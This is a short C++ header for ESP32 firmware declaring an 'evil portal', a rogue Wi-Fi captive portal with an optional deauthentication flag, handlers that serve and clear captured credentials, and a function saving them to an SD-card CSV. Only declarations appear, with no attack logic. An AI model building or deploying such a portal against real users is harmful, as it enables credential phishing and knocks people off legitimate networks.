#include <WiFi.h>
#include <DNSServer.h>
#include "AsyncTCP.h"
#include "ESPAsyncWebServer.h"
#include <SD.h>
#include <SPI.h>

// function defaults

void startEvilPortal(String tssid = "", uint8_t channel = 6, bool deauth = false);

void chooseHtml(bool def = true);

String getHtmlContents(String body);

String creds_GET();

String index_GET();

String clear_GET();

String ssid_GET();

String ssid_POST();

void saveToCSV(const String &filename, const String &csvLine);

